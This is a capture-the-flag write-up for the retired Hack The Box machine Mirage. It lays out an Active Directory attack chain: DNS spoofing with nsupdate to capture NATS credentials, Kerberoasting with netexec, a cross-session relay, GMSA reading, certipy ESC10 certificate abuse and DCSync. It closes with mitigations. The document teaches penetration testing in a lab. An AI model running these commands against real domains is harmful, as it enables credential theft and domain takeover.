---
machine: Mirage
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, nfs, nats, kerberoast, relay, gmsa, esc10, dcsync]
---

# Mirage — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An open NFS share contains reports revealing the domain and a `nats-svc` name with no DNS record. Register that name to the attacker and capture NATS credentials; JetStream leaks another password, which is used to Kerberoast `nathan.aadam`. A cross-session relay captures `mark.bbond`'s hash, who force-changes a contractor's password; after enabling the account and fixing its logon hours, read the GMSA and exploit ESC10 to authenticate as the DC machine account and DCSync.

## Recon

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,2049,3268,4222,5985 <IP>
```

- Domain controller `MIRAGE.HTB` with DNS, Kerberos, LDAP, SMB, NFS and WinRM.
- NATS on `4222` and NFS on `2049`.
- NTLM is disabled; Kerberos is required and the clock must be synchronized.

## Enumeration

List the NFS shares and download two PDFs: an authentication hardening report and an incident report about a missing DNS record for `nats-svc.mirage.htb`. The name does not resolve; add an A record to the attacker with `nsupdate` and run a fake NATS server or listener to capture the `CONNECT` username and password.

## Foothold

With NATS credentials, enumerate streams and messages; one contains `david.jjackson`'s password. That user Kerberoasts `nathan.aadam`; crack the TGS and use the credentials over WinRM. From there, observe another user's session and perform a cross-session RPC relay.

```bash
# DNS and NATS capture
nsupdate
> update add nats-svc.mirage.htb 86400 A <ATTACKER>
> send
# Kerberoast and relay
netexec ldap DC01.mirage.htb -u david.jjackson -p '<PASS>' -k --kerberoasting tgs.txt
# ESC10
certipy account -user mark.bbond update -upn 'DC01$@mirage.htb' -target DC01.mirage.htb -k
certipy req -target DC01.mirage.htb -ca mirage-DC01-CA -template User -u mark.bbond@mirage.htb -p '<PASS>'
certipy auth -pfx dc01.pfx -dc-ip <IP> -ldap-shell```

## Lateral movement

The relay captures `mark.bbond`'s hash, which cracks. `mark.bbond` has `ForceChangePassword` over `javier.mmarshall`; the account is disabled with no logon hours, so enable it and set `logonHours` with `bloodyAD`. `javier.mmarshall` can read the GMSA password for `Mirage-Service$`.

## Privilege escalation

`Mirage-Service$` can write `mark.bbond`'s UPN. The DC has `CertificateMappingMethods=0x4`, so ESC10 lets you change `mark.bbond`'s UPN to `DC01$`, request a certificate with the `User` template, restore the UPN and authenticate as the machine account. From there, DCSync and get Administrator's hash.

## Evidence

- NFS reports and missing DNS record.
- Captured NATS credentials and a message with another password.
- Kerberoast, session relay and password change.
- GMSA and ESC10 through DCSync.

## Lessons learned

- A missing DNS record can be spoofed to capture credentials.
- NATS bus messages may contain secrets.
- Cross-session relay bypasses NTLM restrictions.
- ESC10 depends on Schannel UPN mapping, not just templates.

## Mitigation and detection

- Register every internal name and use DNSSEC.
- Restrict NATS and keep credentials off the bus.
- Audit AD ACLs, disabled accounts and logon hours.
- Review `CertificateMappingMethods` and enforce least privilege.

## References

- [0xdf — Mirage](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [IppSec — Mirage](https://www.youtube.com/watch?v=0oSGKL9jbAQ)
- [Hack The Box — Mirage](https://app.hackthebox.com/machines/mirage)
